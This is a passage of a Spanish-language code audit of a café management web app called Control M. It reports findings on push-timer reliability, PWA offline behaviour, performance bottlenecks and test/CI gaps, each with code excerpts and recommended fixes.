**Salud:** Riesgo real de FALLO SILENCIOSO del aviso sous-vide: en un dyno que se duerme/reinicia, el temporizador se pierde sin avisar y, si el push se retrasa, llega con un TTL por defecto de 4 semanas (aviso caduco y engañoso). La capa offline es inexistente (app en blanco sin red) y hay doble notificación en primer plano. Nada compromete el dinero, pero la feature estrella "te avisa aunque la app esté cerrada" no es fiable tal cual.

### pwa.1 · El aviso 'retira' se pierde en silencio si el server duerme/reinicia en la ventana del temporizador

**🟠 ALTO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* sous-vide / fiabilidad

*Ubicación:* `backend/sv-timers.js:60-65`

```js
function init() {
  const now = Date.now();
  const vivos = leer().filter((t) => t.fireAt > now);
  guardar(vivos);
  vivos.forEach(agendar);
}
```

**Problema:** El temporizador solo vive como setTimeout EN MEMORIA (agendar, sv-timers.js:34-40) y no hay despertador por-temporizador: el único cron externo (GitHub Actions → /avisos/cron) es HORARIO y además solo dispara el recordatorio de pedidos, nunca sv-timers. Render se duerme tras ~15 min de inactividad. Si un sous-vide de 25 min arranca a las :05 y el dyno se duerme a las :20, el setTimeout nunca corre; y al despertar/reiniciar, init() filtra 'vivos = fireAt > now', GUARDA esa lista (borrando los ya vencidos) y NO dispara los caducados. El aviso desaparece sin rastro.

**Impacto:** El equipo confía en que sonará 'retira' y deja el producto en el baño sous-vide pasado de tiempo: textura/seguridad alimentaria comprometidas (huevo, bases, aromáticas), merma y producto a la basura. Es justo el caso para el que se construyó la feature (app cerrada) el que más falla.

**Recomendación:** En init(), para los temporizadores con fireAt<=now dentro de una ventana de gracia (p.ej. 6 h) DISPARAR un push de recuperación ('ya debería estar listo, revisa') en vez de borrarlos; borrar solo los muy antiguos. Añadir un despertador externo: que el cron horario (o uno cada pocos min) llame a un tick de sv-timers que dispare los vencidos, de modo que no dependa de que el proceso siga vivo. Idealmente persistir 'disparado' para no duplicar.

### pwa.2 · El push sale con TTL por defecto de 4 semanas y urgencia normal: el 'retira' puede llegar caduco

**🟠 ALTO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* push / entrega

*Ubicación:* `backend/push.js:80`

```js
await webpush.sendNotification({ endpoint: s.endpoint, keys: s.keys }, data);
```

**Problema:** sendNotification se llama sin opciones, así que web-push aplica su DEFAULT_TTL (confirmado en node_modules/web-push/src/web-push-lib.js:13 → const DEFAULT_TTL = 2419200, 4 semanas) y urgencia 'normal'. Si el dispositivo está sin red cuando se envía el push, el servicio de push (FCM/Mozilla/Apple) lo RETIENE y lo entrega hasta 4 semanas después. Para un aviso de cocina de minutos eso es un aviso caduco, no una entrega fiable.

**Impacto:** El móvil del equipo recibe '⏰ Retira el producto del sous-vide' horas o días tarde: o van a retirar algo que ya se retiró, o dejan de fiarse de la alarma. Un aviso con hora implícita que llega fuera de hora es peor que no tener alarma.

**Recomendación:** Pasar opciones a sendNotification: para el sous-vide un TTL corto (p.ej. los minutos restantes o un máximo de ~5-10 min) y urgency:'high'; para los avisos diarios un TTL de unas horas. Lo más limpio: que el payload lleve su propio ttl/urgency y enviarATodos los reenvíe. Es un cambio de pocas líneas.

### pwa.3 · VAPID regenerado en modo efímero mata todas las suscripciones sin avisar; la limpieza de muertos no cubre el fallo

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* push / persistencia

*Ubicación:* `backend/push.js:84`

```js
if (e.statusCode === 404 || e.statusCode === 410) muertos.push(s.endpoint);
```

**Problema:** Si no hay VAPID_PUBLIC_KEY/PRIVATE_KEY en entorno y no hay Postgres, loadKeys() genera claves NUEVAS en cada arranque (push.js:24-34). Las suscripciones viejas, firmadas con la clave anterior, pasan a fallar con 403/400 (clave no coincide), no con 404/410 — así que NO entran en 'muertos' y nunca se limpian ni se reintentan. Peor: el front sigue mostrando '✓ Avisos activados' porque getSubscription() devuelve la suscripción vieja; nadie se entera de que el canal está muerto. (El propio comentario del módulo lo documenta, pero nada lo detecta ni lo fuerza.)

**Impacto:** Tras cualquier reinicio sin claves fijas (o si se pierde la tabla config), TODOS los avisos —recordatorio de pedidos Y 'retira' del sous-vide— dejan de llegar en silencio mientras la app jura que están activos. En producción con Postgres queda mitigado porque las claves persisten en config, pero el canal sigue siendo frágil y el recuento de 'dispositivos' miente.

**Recomendación:** Fijar VAPID_PUBLIC_KEY/VAPID_PRIVATE_KEY en variables de entorno de Render (fuente de verdad, independiente de la BD) y documentarlo como requisito de deploy. En enviarATodos, tratar también 403 (y 400 de clave) como suscripción a reparar/eliminar y, si falla un alto % de envíos, registrar un aviso claro. En el front, revalidar la suscripción contra la clave pública actual del servidor y re-suscribir si cambió.

### pwa.4 · Service Worker sin precache del app-shell: la app es inservible sin red

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* PWA / offline

*Ubicación:* `frontend/sw.js:13`

```js
self.addEventListener("fetch", () => {});
```

**Problema:** El handler de fetch es un passthrough vacío que no llama a event.respondWith ni cachea nada (es intencionado, para servir siempre la última versión). Resultado: sin conexión no hay NADA en caché, ni siquiera index.html, el manifest o los iconos. Un corte de wifi en la barra deja la PWA en blanco.

**Impacto:** En un café la red del local se cae o va intermitente. Con esto, un microcorte deja sin abrir toda la herramienta en el peor momento: cierre de caja con efectivo en mano, consulta de carta, o los propios temporizadores. La app no degrada, muere.

**Recomendación:** Precachear el app-shell (index.html, manifest.webmanifest, iconos, fuentes locales) en el evento install y servir con estrategia network-first para el HTML (mantiene el 'siempre lo último' cuando hay red) y cache-first para estáticos, con un fallback offline amable. Se conserva el objetivo de versión en vivo sin sacrificar que la app abra.

### pwa.5 · Notificación duplicada cuando la app está en primer plano

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* push / UX

*Ubicación:* `frontend/sw.js:30`

```js
event.waitUntil(self.registration.showNotification(title, options));
```

**Problema:** El handler 'push' del SW muestra SIEMPRE la notificación del sistema, sin comprobar si hay una ventana cliente visible/enfocada (no hay clients.matchAll({visibilityState:'visible'})). A la vez, al vencer el temporizador con la app abierta, la página dispara su propia alarma local en index.html:4968 (new Notification("⏰ Retira: "+c.label, {...})) además del beep y la vibración. Como los tags no coinciden (local usa el id de cliente 'sv'+N; el push usa el id de servidor 'svp...'), no se colapsan.

**Impacto:** En el dispositivo que arrancó el temporizador aparecen DOS avisos 'retira' casi simultáneos (en escritorio dos notificaciones del sistema; en móvil, beep+vibración local más la notificación del push). Ruido que resta credibilidad a la alarma y confunde sobre si hay uno o dos productos que retirar.

**Recomendación:** En el push handler, hacer clients.matchAll({type:'window'}) y si hay un cliente ENFOCADO que ya gestiona la alarma, omitir o reemplazar la notificación; o que la página suprima su Notification local cuando espera el push del servidor. Alinear el 'tag' entre cliente y servidor (enviar el id del cliente en el POST) para que renotify colapse en una sola.

### pwa.6 · Carrera en svtStop: el push del servidor no se cancela si paras el temporizador antes de recibir el id

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* sous-vide / UX

*Ubicación:* `frontend/index.html:4903-4906`

```js
function svtStop(id){
  const t = (window._svt||[]).find(x=>x.id===id);
  if(t && t.pushId){ api("/avisos/temporizador/"+t.pushId,{method:"DELETE"}).catch(()=>{}); }
  window._svt = (window._svt||[]).filter(c=>c.id!==id); svtRender();
}
```

**Problema:** El pushId (id del temporizador en el servidor) solo se asigna cuando responde el POST (index.html:4900-4901, .then(r=>{ t.pushId = r.id; })). Si el usuario pulsa quitar (✕) antes de que llegue esa respuesta, t.pushId es null, el DELETE no se envía y el temporizador del servidor sigue vivo.

**Impacto:** Salta el push '⏰ Retira' de un temporizador que el usuario ya había cancelado: el equipo va a retirar algo que no está en el baño, o desconfía de la alarma. Poco frecuente, pero rompe la expectativa de 'lo quité y ya está'.

**Recomendación:** Generar el id del temporizador en el cliente y mandarlo en el POST (que el servidor lo use como clave), de modo que cancelar y agendar compartan id sin depender de la respuesta; o marcar un flag 'cancelado' en t y, al resolver el POST, si está cancelado, lanzar el DELETE inmediatamente.

### pwa.7 · El manifest no declara 'id' de aplicación

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: media

*Área:* PWA / manifest

*Ubicación:* `frontend/manifest.webmanifest:5`

```js
"start_url": "/",
  "scope": "/",
```

**Problema:** No hay campo 'id' en el manifest, así que la identidad de la PWA se deriva de start_url. Si algún día cambia start_url, los navegadores pueden tratar la app como una instalación nueva (icono duplicado, pérdida de permisos de notificación ya concedidos).

**Impacto:** Bajo hoy: funciona. Pero ata la identidad de la app instalada (y sus permisos de push ya aceptados) a que start_url no cambie nunca; un cambio futuro obligaría al equipo a reinstalar y volver a 'Activar avisos'.

**Recomendación:** Añadir "id": "/" (o un identificador estable tipo "/?app=controlm") al manifest para fijar la identidad con independencia de start_url.

---

## 8 · Rendimiento y escalabilidad

**Cómo funciona hoy:** Control M guarda cada entidad (ventas, stock_movements, materias...) como filas JSONB en Postgres, pero NO consulta por SQL en caliente: al arrancar, data-store.init() hace db.loadAll (SELECT data ... ORDER BY seq) de TODAS las tablas y las deja enteras en una cache en memoria; readAll(name) devuelve el array completo y todo el filtrado (por fecha, por rango) se hace en JavaScript recorriendo el array. El dinero lo componen financials.js/costing.js sobre esos arrays. La portada CEO llama a /api/dashboard, que ejecuta dashboard-ceo.calcular -> executive.construir + financials.beneficio + analisis-diario, recalculando todo desde cero en cada petición (sin caché) y recorriendo ventas decenas de veces; el front repolla cada 3 min (setInterval 180000). Las ventas entran por el conector TPV (cada ~15 min) y por import manual/email, y ambas vías terminan en agora.importarDocs, que hace store.writeAll('ventas', ventas) -> db.replaceAll (DELETE de toda la tabla + re-INSERT fila a fila). El frontend es un único index.html de ~950KB servido por express.static, sin middleware de compresión, con Cache-Control no-store, y el service worker tiene un handler fetch vacío que no cachea nada. Hoy ventas.json y stock_movements.json están a 0 registros (datos reseteados), así que todo esto es instantáneo AHORA; el problema aparece al acumular 1-2 años de histórico.

**Salud:** Funciona de sobra con pocos datos, pero la arquitectura "todo en memoria + recalcular todo en cada request + reescribir la tabla entera en cada sync" tiene varios techos duros que se alcanzan con 1-2 años de ventas: el proceso puede congelarse en cada poll del dashboard y quedarse sin memoria al arrancar. Hay 2 bombas críticas (reescritura total de ventas por sync; dashboard sin caché con ~30-40 pasadas sobre ventas) que conviene atacar antes de que el volumen crezca.

### rendimiento.1 · Cada sincronización de Ágora reescribe TODA la tabla de ventas (DELETE + re-INSERT de todo el histórico)

**🔴 CRÍTICO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Ingesta Ágora / persistencia

*Ubicación:* `backend/agora.js:314-316`

```js
movimientos.forEach((mv) => store.insert("stock_movements", mv));
  store.writeAll("materias", materias);
  store.writeAll("ventas", ventas);
```

**Problema:** importarDocs (al que llegan TANTO el conector TPV cada ~15 min como el import manual/email) empuja las ventas nuevas al array en memoria y luego persiste la colección COMPLETA con writeAll('ventas', ventas). writeAll -> persistAll -> db.replaceAll, que hace 'DELETE FROM ventas' y luego un bucle de INSERT fila a fila por CADA venta histórica. No usa la vía incremental por fila (persistUpsert/insert) que el propio data-store ya ofrece.

**Impacto:** Con 1-2 años de histórico (cientos de miles de líneas de venta), cada sync del conector borra y vuelve a insertar TODO el histórico, no solo lo nuevo: cientos de miles de INSERT secuenciales (await por fila) dentro de una transacción, cada ~15 minutos. Esto satura la conexión a Postgres (pool max 5), bloquea otras escrituras, alarga la respuesta del conector y, en modo JSON efímero, reescribe el fichero entero sincrónicamente bloqueando el event loop. Es el fallo que primero tumba el sistema al crecer.

**Recomendación:** No llamar a writeAll('ventas'). Acumular solo las filas nuevas y hacer store.insert('ventas', fila) por cada venta nueva (persistUpsert ya escribe una sola fila incremental). Igual para materias: usar store.update por materia tocada en vez de writeAll. db.replaceAll debe quedar solo para siembra/migración, como ya dice su propio comentario.

### rendimiento.2 · /api/dashboard recalcula ~30-40 pasadas completas sobre ventas por llamada, sin caché, y el front repolla cada 3 min

**🔴 CRÍTICO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Dashboard CEO

*Ubicación:* `backend/dashboard-ceo.js:204-237`

```js
const benHoy = financials.beneficio(rHoy, now);
  ...
  const mediaDiaSem = mediaMismoDiaSemana(now, idx, idxMat);
```

**Problema:** calcular() no cachea nada: en cada request llama a executive.construir (que invoca financials.beneficio 6-7 veces, y cada beneficio() recorre ventas 3 veces: ventasEnRango + ventasNetasEnRango + costeMateriaVendidaEnRango), y además vuelve a calcular beneficio('hoy') por tercera vez aquí, ventaDia de hoy, mediaMismoDiaSemana (8 ventaDia -> 8 filtros del array completo), vSemPasada y serieMes. beneficio('hoy') acaba calculado 3 veces (executive L97 beneficioActual, L140 benHoy, y aquí L204) = 9 escaneos redundantes solo para hoy.

**Impacto:** Node es monohilo. Con histórico de 1-2 años, cada poll de la portada (cada 3 min, cuando la pestaña está visible) hace millones de visitas a objetos + recursión de coste y BLOQUEA el event loop: la app se congela para TODOS los usuarios (equipo incluido) durante cada recálculo. Es trabajo tirado: recalcula lo mismo decenas de veces por petición y en cada petición.

**Recomendación:** 1) Memoizar beneficio por rango dentro de una misma request (el benCache de executive-dashboard ya existe parcialmente; extenderlo y compartirlo con dashboard-ceo para no recalcular 'hoy'/'mes' 2-3 veces). 2) Cachear la respuesta de /api/dashboard con un TTL corto (30-60 s) por usuario, invalidando al importar ventas. 3) A medio plazo, precomputar agregados por día (ventas/coste/tickets) en una tabla resumen y leer de ahí.

### rendimiento.3 · Toda la base de datos se carga entera en memoria al arrancar; nunca se consulta por fecha en SQL

**🟠 ALTO** · estado: abierto · esfuerzo: L · confianza: alta

*Área:* Arquitectura data-store

*Ubicación:* `backend/data-store.js:122-134`

```js
await db.ensureTable(name);
      let rows = await db.loadAll(name);
      ...
      cache[name] = rows;
```

**Problema:** init() hace db.loadAll(name) de cada entidad (SELECT data FROM t ORDER BY seq ASC) y la mete entera en cache; readAll devuelve el array completo. Las entidades de alto volumen (ventas, stock_movements) se tratan igual que las pequeñas (config, usuarios). No hay ninguna consulta SQL con WHERE fecha/índice: Postgres solo actúa de almacén durable, y toda la selección por fecha se hace recorriendo arrays en JS.

**Impacto:** Techo de memoria y de arranque. Con 2 años de ventas (p.ej. 200-400k líneas) + stock_movements (1+ por línea), la cache puede ocupar cientos de MB; en una instancia pequeña de Render (512MB) el proceso puede quedarse sin memoria al cargar todo en el boot, y el arranque se vuelve lento (carga todo antes de aceptar peticiones). Ningún índice de Postgres ayuda porque la app no consulta por SQL.

**Recomendación:** Separar las entidades 'de evento' de alto volumen (ventas, stock_movements) de la cache completa: consultarlas por SQL con WHERE sobre fecha e índice (crear índice en data->>'fecha'), o mantener una tabla de agregados diarios. Dejar la cache en memoria solo para catálogos pequeños (productos, materias, config).

### rendimiento.4 · index.html de ~950KB sin compresión (no hay middleware compression), con no-store y service worker que no cachea

**🟠 ALTO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Frontend / red

*Ubicación:* `backend/server.js:407-409`

```js
res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
```

**Problema:** No existe el middleware compression en el stack (confirmado: no está en dependencias ni en server.js). express.static sirve el index.html de ~950KB tal cual, y encima con Cache-Control 'no-cache, no-store, must-revalidate', así que el navegador lo re-descarga ENTERO en cada carga. El service worker (frontend/sw.js) tiene un handler fetch vacío que explícitamente no cachea nada.

**Impacto:** Cada apertura o refresco de la app descarga ~950KB sin gzip. Un HTML así comprime a ~150-180KB (5-6x). En el local, sobre 4G/móvil y datos, eso es carga lenta y consumo innecesario cada vez que alguien del equipo abre la app o la PWA se reinicia. Afecta a todos los dispositivos, todo el día.

**Recomendación:** 1) Añadir el middleware compression (gzip/brotli) en server.js: una línea, impacto inmediato en todas las respuestas (HTML y JSON del dashboard, que también es grande). 2) Sustituir no-store por validación con ETag (ya hay etag:true) o un SW con estrategia network-first que sirva la copia cacheada si la red falla, para no re-descargar el bundle entero cuando no cambió.

### rendimiento.5 · costing.costeProducto recursivo sin memoizar, llamado por cada línea de venta dentro de cada escaneo

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Motor de coste

*Ubicación:* `backend/costing.js:29-47`

```js
const costeLote = (rec.ingredientes || []).reduce(
        (s, ing) => s + costeMateriaEfectivo(ing.materia_id, idxMat, idxRecProd, vis) * (Number(ing.cantidad) || 0),
        0
      );
      return costeLote / base;
```

**Problema:** costeMateriaEfectivo es recursivo (una elaboración deriva su coste de los ingredientes de su receta, recursivamente) y no cachea resultados. costeProducto lo invoca por producto; a su vez se llama por CADA línea de venta en financials.costeMateriaVendidaEnRango (L58-66) y en analisis-diario.ventaDia (L54), que se ejecutan en cada una de las ~30-40 pasadas del dashboard.

**Impacto:** El coste de una misma elaboración se recomputa desde cero (todo su árbol de ingredientes) por cada línea de venta y por cada pasada del dashboard. Con histórico grande y recetas anidadas, el CPU se multiplica y se suma a la congestión del event loop del dashboard. Los productos de Ágora con coste_materia directo se libran (ruta O(1)), pero las elaboraciones no.

**Recomendación:** Memoizar el coste por producto_id una sola vez por request (un Map { producto_id -> coste }) y reutilizarlo en todas las líneas y pasadas, o precalcular costePorProducto al cargar el índice de materias/recetas. Invalidar al cambiar recetas/precios.

### rendimiento.6 · GET /api/ventas devuelve el array completo invertido, sin paginar

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* API ventas

*Ubicación:* `backend/routes/ventas.js:63-65`

```js
router.get("/", (req, res) => {
  res.json(store.readAll("ventas").slice().reverse());
});
```

**Problema:** El endpoint devuelve store.readAll('ventas').slice().reverse() entero: copia todo el array, lo invierte y lo serializa a JSON sin límite ni filtro por fecha.

**Impacto:** Con 1-2 años de histórico, una sola petición serializa cientos de miles de objetos (decenas de MB de JSON), consume CPU/memoria en el servidor y puede congelar el navegador que lo pinte. Hoy no duele porque hay 0 ventas, pero escala linealmente con el histórico.

**Recomendación:** Paginar y filtrar: aceptar ?desde/&hasta y limit/offset (o cursor por seq), devolver solo la ventana pedida, y para informes exponer agregados en vez del detalle completo.

### rendimiento.7 · stock_movements crece sin límite (1+ por línea de venta) y se carga entero en memoria; sin archivado ni retención

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: media

*Área:* Libro de stock

*Ubicación:* `backend/agora.js:292-297`

```js
movimientos.push({
          id: store.nextId("mov", "stock_movements"),
          source: "agora", source_ref: `${type}:${serie}:${number}`,
          materia_id: m.id, delta, unidad: m.unidad || "", reason: "venta",
```

**Problema:** Por cada línea de venta se inserta un movimiento por cada ingrediente del escandallo en stock_movements, que está en la lista ENTITIES y por tanto se carga completa en la cache en memoria al arrancar. No hay ninguna política de purga, archivado ni corte temporal: es la tabla que más rápido crece de todo el sistema.

**Impacto:** Un producto con 3-4 ingredientes genera 3-4 movimientos por venta; a escala de local real son millones de filas en 1-2 años. Al cargarse todas en memoria (como el resto de entidades) infla el consumo de RAM y el tiempo de arranque, acercando el OOM. Nadie consulta el histórico completo en caliente, pero igualmente se mantiene residente.

**Recomendación:** Política de retención/archivado: mover movimientos con > N días (p.ej. 90) a una tabla fría o resumen por materia/día, y NO cargar stock_movements completa en la cache (consultarla por SQL bajo demanda). Conserva trazabilidad sin penalizar memoria/arranque.

### rendimiento.8 · En modo JSON (fallback sin DATABASE_URL) cada insert/update reescribe el fichero entero de forma síncrona

**⚪ BAJO** · estado: parcial (arreglado a medias) · esfuerzo: M · confianza: media

*Área:* Persistencia fallback

*Ubicación:* `backend/data-store.js:162-166`

```js
function persistUpsert(name, row) {
  if (usingDb) return encolar(name, () => db.upsert(name, row));
  writeFile(name, cache[name]); // JSON: durable y síncrono
  return Promise.resolve();
}
```

**Problema:** persistUpsert/persistDelete en modo ficheros (sin Postgres) llaman a writeFile(name, cache[name]), que hace JSON.stringify del array completo + fs.writeFileSync (bloqueante) en CADA mutación de una sola fila.

**Impacto:** Si Render arranca en modo efímero (sin DATABASE_URL), cada venta reescribe todo ventas.json de forma síncrona, bloqueando el event loop: O(n) de disco por cada mutación. Está parcialmente mitigado por el aviso de persistencia efímera y por REQUIRE_DB=1, pero si ese flag no está puesto el riesgo sigue vivo en producción.

**Recomendación:** En modo JSON, escribir por lotes/debounce (agrupar mutaciones y volcar una vez) o hacer append incremental; y en producción forzar REQUIRE_DB=1 para que no se pueda arrancar en modo fichero por error.

---

## 9 · Tests, CI, calidad de código y observabilidad

**Cómo funciona hoy:** Control M es un backend Node/Express (backend/server.js monta ~60 routers bajo /api, con auth.requerido + economia-guard.filtrarRespuestas como middlewares globales) que persiste en PostgreSQL si hay DATABASE_URL o, si no, en ficheros JSON en backend/data via backend/data-store.js. Las pruebas son 72 ficheros *.unit.js (cada uno un script Node casero con assert y un test() propio que hace process.exit(1) al fallar) encadenados con && en el script "test:unit" de package.json, mas un unico e2e.spec.js de Playwright (2075 lineas, 102 tests, fullyParallel:false) que arranca el servidor real en el puerto 4001. "npm test" = test:unit, luego "git checkout -- backend/data", luego test:e2e. CI (.github/workflows/ci.yml) ejecuta "npm test" en push a main/claude/** y PR a main; deploy.yml dispara Render en push a main. No hay ESLint, Prettier, ni herramienta de cobertura. El servidor no tiene error handler global de Express, ni handlers de process para unhandledRejection/uncaughtException, ni logging de peticiones; el logging es ~51 console.* sueltos. La regla nº2 (el equipo nunca ve dinero) la protege economia-guard (global) y se verifica por HTTP en un test e2e sobre una lista fija de rutas.

**Salud:** Enferma en los cimientos no funcionales: la logica de negocio esta razonablemente testeada, pero la plataforma carece de red de seguridad operativa (sin manejo de errores a nivel de proceso, escrituras que confirman exito sin haberse guardado, sin linter ni cobertura, reset de datos de test fragil y manual). Para un cafe que depende de esta app en pleno servicio, el mayor riesgo es de disponibilidad y de integridad de datos, no de calculo.

### tests.1 · Escrituras que confirman exito sin haberse guardado (modo PostgreSQL)

**🟠 ALTO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Observabilidad / Integridad de datos

*Ubicación:* `backend/data-store.js:150-166, 203-208`

```js
const next = prev.then(op).catch((e) => console.error(`Error guardando '${name}':`, e.message)); ... function flush() { return Promise.allSettled(Object.values(colas)); } ... function insert(name, item) { items.push(item); persistUpsert(name, item); return item; }
```

**Problema:** En modo Postgres, insert()/update() NO esperan la persistencia: devuelven la fila sincronamente y la escritura real va a una cola (encolar) que captura cualquier error y solo hace console.error. Las rutas responden tras 'await store.flush()', pero flush() usa Promise.allSettled, que NUNCA rechaza aunque la escritura haya fallado. Resultado: si Postgres esta caido, lento o rechaza la fila, la ruta responde 200 OK y el frontend dice 'guardado' cuando la fila no se guardo.

**Impacto:** Una venta, un cierre de caja o una ficha que el equipo cree registrada puede perderse sin ningun aviso. En un cierre de caja o un albaran, descuadres de dinero/stock imposibles de rastrear porque no queda ni error visible ni registro.

**Recomendación:** Que persistUpsert/persistDelete devuelvan la promesa real de escritura y que insert/update/remove la expongan; que flush() rechace (o devuelva los rejected de allSettled) si alguna escritura fallo, y que las rutas criticas (ventas, cierre-caja, recepciones) comprueben ese resultado y devuelvan 500 si no se confirmo. Alternativa minima: no tragar el error en encolar y propagar el fallo al flush de esa entidad.

### tests.2 · Sin red de seguridad a nivel de proceso: un throw async no capturado tumba el servidor

**🟠 ALTO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Observabilidad / Disponibilidad

*Ubicación:* `backend/server.js (todo el fichero); rutas backend/routes/mbds.js:73-234, lotes.js, turnos.js, debts.js, fichaje.js`

```js
router.post("/ingredientes", jsonGrande, async (req, res) => { ... store.insert("mbds_ingredientes", ing); await store.flush(); ... });  // 11 handlers async en mbds.js, 0 bloques try
```

**Problema:** No existe ningun process.on('unhandledRejection') ni process.on('uncaughtException') en todo el backend, y 28 de ~61 ficheros de rutas no tienen un solo try/catch; varios tienen handlers async (mbds 11, lotes 3, turnos 3, debts 3, fichaje 1). En Express 4 un rechazo en un handler async NO lo captura Express: se vuelve unhandledRejection, y en Node >=18 el comportamiento por defecto es terminar el proceso. Un unico request que provoque un throw async no capturado puede tirar todo el servidor.

**Impacto:** El BOS del cafe (pedidos, cierre de caja, etiquetas, fichaje) cae en pleno servicio hasta que Render reinicia; peticiones en vuelo perdidas. Sin el handler de proceso tampoco queda traza del porque.

**Recomendación:** Anadir en server.js process.on('unhandledRejection') y process.on('uncaughtException') que logueen (y, en uncaughtException, cierren ordenadamente). Envolver los handlers async con un wrapper asyncHandler(fn) que haga catch->next(err), o migrar a un helper comun. Es la defensa de ultimo recurso que falta.

### tests.3 · Reset de datos de test solo ANTES del e2e, nunca despues, y dependiente de disciplina manual

**🟠 ALTO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* CI / Fiabilidad de tests

*Ubicación:* `package.json:10`

```js
"test": "npm run test:unit && git checkout -- backend/data && npm run test:e2e"
```

**Problema:** El reset ocurre solo entre unit y e2e. No se resetea ANTES de los unit (31 de 72 ficheros escriben en el store compartido y ensucian backend/data en modo JSON), ni DESPUES del e2e (el servidor real re-siembra y los tests mutan los JSON). Ademas usa 'git checkout -- backend/data' (restaura desde el indice, no desde HEAD): si algo quedo en staging no se limpia. La unica salvaguarda de 'antes y despues' esta en CLAUDE.md como paso humano.

**Impacto:** Tras un 'npm test' los fixtures de backend/data quedan sucios y versionados: es facil commitear datos mutados por los tests, y una ejecucion que arranca sucia da falsos verdes o falsos rojos. En CI el checkout es limpio, pero en local es una trampa recurrente.

**Recomendación:** Resetear antes Y despues de cada fase: 'git checkout HEAD -- backend/data && npm run test:unit && git checkout HEAD -- backend/data && npm run test:e2e && git checkout HEAD -- backend/data'. Mejor aun: que los tests usen un DATA_DIR temporal (via variable de entorno leida por data-store) para no tocar nunca los fixtures versionados.

### tests.4 · Sin error handler global de Express ni 404 de /api: respuestas de error inconsistentes y fuga de stack

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Observabilidad

*Ubicación:* `backend/server.js:325-415 (no hay app.use((err,req,res,next)) tras montar las rutas)`

```js
app.use("/api", auth.requerido); app.use("/api", require("./economia-guard").filtrarRespuestas); app.use("/api/inicio", require("./routes/inicio")); ... app.use(express.static(path.join(__dirname, "..", "frontend"), { ... }));  // no hay middleware final de errores ni 404
```

**Problema:** No hay un manejador de errores central (err,req,res,next) ni un 404 para rutas /api desconocidas. Los throws sincronos en las 28 rutas sin try/catch caen en el handler por defecto de Express, que fuera de produccion devuelve el stack trace al cliente; las rutas que si capturan devuelven el e.message en texto plano, cada una con su propio formato. No hay forma homogenea de loguear ni responder los fallos.

**Impacto:** Errores con formato dispar que el frontend no puede tratar uniformemente, posible filtracion de rutas/stack internos, y cero trazabilidad centralizada de fallos del servidor en produccion.

**Recomendación:** Anadir al final de server.js un 404 JSON para /api y un error handler global (err,req,res,next) que loguee con contexto (metodo, ruta, usuario) y devuelva un JSON estable { error } sin stack en produccion. Unificar ahi el formato de error de todas las rutas.

### tests.5 · Runner de tests fragil: 72 ficheros encadenados con && en un script, sin framework ni cobertura

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* CI / Calidad

*Ubicación:* `package.json:8`

```js
"test:unit": "node tests/persistence.unit.js && node tests/agora.unit.js && ... && node tests/agora-cuadre.unit.js"  // 72 ficheros encadenados con &&
```

**Problema:** Los 72 unit se encadenan con && en una sola linea. Por el process.exit(1) + &&, el primer fallo detiene todo: nunca ves cuantos tests mas fallan (fail-fast total). El wiring es manual: un *.unit.js nuevo que no se anada a esta cadena NUNCA se ejecuta y nada avisa (hoy coinciden 72/72, pero es por disciplina). Cada fichero arranca un proceso node nuevo (lento) y no hay framework (sin describe/it, sin reporte agregado) ni cobertura (sin nyc/c8).

**Impacto:** Feedback lento y parcial: cada iteracion solo revela un fallo; es facil introducir un test que parece existir pero no corre; sin cobertura no se sabe que logica de dinero queda sin probar. Para un sistema cuya regla es 'no se despliega si no pasa CI', el CI es mas fragil de lo que aparenta.

**Recomendación:** Adoptar el runner de test nativo de Node (node --test tests/*.unit.js, ya disponible en Node 18+) o un framework ligero; auto-descubrir los ficheros por glob en vez de listarlos a mano; anadir cobertura con c8 y un umbral minimo en CI.

### tests.6 · Sin ESLint/Prettier ni analisis estatico en 14k lineas de front monofichero + ~90 ficheros backend

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Calidad de codigo

*Ubicación:* `(raiz del repo: no existen .eslintrc*, eslint.config.*, .prettierrc*)`

```js
frontend/index.html = 13852 lineas / 974 KB en un solo fichero, vanilla JS, con convencion de prefijos (lim*/spz*/lab*/cja*/svt*) para evitar colisiones de nombres
```

**Problema:** No hay linter ni formateador configurado. El propio CLAUDE.md advierte que las colisiones de prefijos en el fichero unico ya han ocurrido (wiz-/crono*) y pide comprobarlo a mano. Sin ESLint no hay red automatica contra variables no declaradas, funciones duplicadas, referencias undefined, promesas sin await ni los olvidos de esc() que la propia guia exige.

**Impacto:** Bugs que un linter atraparia en segundos (una funcion redefinida, un esc() olvidado -> XSS, un await que falta) llegan a produccion y solo se detectan en el cafe. Mantener 14k lineas sin analisis estatico multiplica el coste de cada cambio.

**Recomendación:** Anadir ESLint (eslint:recommended + no-undef, no-unused-vars, require-await) para backend/ y, en el front, al menos un script de chequeo de funciones duplicadas por prefijo; integrarlo como paso de CI previo a los tests. Prettier opcional para formato.

### tests.7 · La regla n2 por HTTP se verifica sobre una lista fija de rutas; rutas money-adjacent del equipo sin cubrir

**🟡 MEDIO** · estado: parcial (arreglado a medias) · esfuerzo: M · confianza: media

*Área:* Cobertura de reglas innegociables

*Ubicación:* `tests/e2e.spec.js:604-624`

```js
const RUTAS = ["/api/inicio", "/api/materias", "/api/carta", "/api/recetas", "/api/mbds/ingredientes", "/api/mbds/bebidas", "/api/mermas"]; ... expect(comprobadas, "deben comprobarse las rutas clave del equipo").toBeGreaterThanOrEqual(4);
```

